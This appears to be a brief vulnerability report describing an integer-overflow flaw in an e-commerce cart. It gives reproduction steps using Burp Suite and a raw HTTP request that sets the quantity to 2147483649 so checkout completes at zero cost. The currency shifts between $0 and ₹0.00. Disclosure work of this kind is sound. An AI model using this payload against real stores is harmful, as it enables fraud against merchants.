## Use case

The vulnerability was in the e-commerce platform's handling of quantity inputs, allowing an attacker to exploit an integer overflow to set the total price of items to $0, bypassing payment processing entirely.

## Steps to test

1. Navigate to any product page on the platform and add the item to the cart.
2. Go to the cart review page and capture the update-quantity request using Burp Suite.
3. Replace the existing quantity value with 2147483649.
4. Forward the request to the server.
5. Verify that the cart total updates to ₹0.00.
6. Complete the checkout process to generate a confirmed order without charging a payment card.

## Commands

```text
POST /cart/update-quantity HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: [length]
{"item_id": "[item_id]", "quantity": 2147483649}
```
